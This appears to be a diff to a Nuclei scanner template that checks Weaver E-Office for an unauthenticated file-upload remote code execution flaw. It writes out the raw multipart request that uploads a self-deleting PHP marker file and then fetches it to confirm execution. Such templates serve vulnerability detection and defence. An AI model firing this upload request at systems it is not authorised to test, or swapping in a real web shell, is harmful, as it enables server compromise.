@@ -11,10 +11,11 @@ info:
     verified: true
     max-request: 3
     fofa-query: app="泛微-EOffice"
-  tags: weaver,e-office,oa,instrusive,rce,intrusive
+  tags: weaver,e-office,oa,intrusive,rce,intrusive,fileupload
+
 variables:
   filename: "{{to_lower(rand_base(5))}}"
-  string: "{{randstr}}"
+  string: "weaver-uploadify-file-upload"
 
 http:
   - raw:
@@ -33,7 +34,7 @@ http:
         Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"
         Content-Type: application/octet-stream
 
-        <?php echo "{{randstr}}";unlink(__FILE__);?>
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
         ------WebKitFormBoundaryjetvpuye--
       - |
         GET /attachment/personal/_temp.php HTTP/1.1
@@ -43,8 +44,11 @@ http:
     matchers:
       - type: dsl
         dsl:
-          - "status_code_1 == 200"
           - "contains(body_2, 'imageSrc') && contains(body_2, 'height')"
-          - "status_code_3 == 200 && contains(body_3,'{{randstr}}')"
         condition: and
-# digest: 4b0a00483046022100b9ada8f5c9c7c9375352c42246f9fb09f686f69dd499c02fe7b5ebb77c3d48d9022100e417a1341b83b7240f1c5a0bf814d5b9931112064dc0317b19fd6f0e2647a6c6:922c64590222798bb761d5b6d8e72950
+
+      - type: word
+        part: body_3
+        words:
+          - '{{md5(string)}}'
+# digest: 4a0a00473045022079d25e942851eec64a2d5a4c7b892801d27f914782f7f0ae137a95b7c4bffb16022100c760e30cb21fd79198a8ac2fea1062597c4f67294398c4f7f8d4cdf767c411f8:922c64590222798bb761d5b6d8e72950
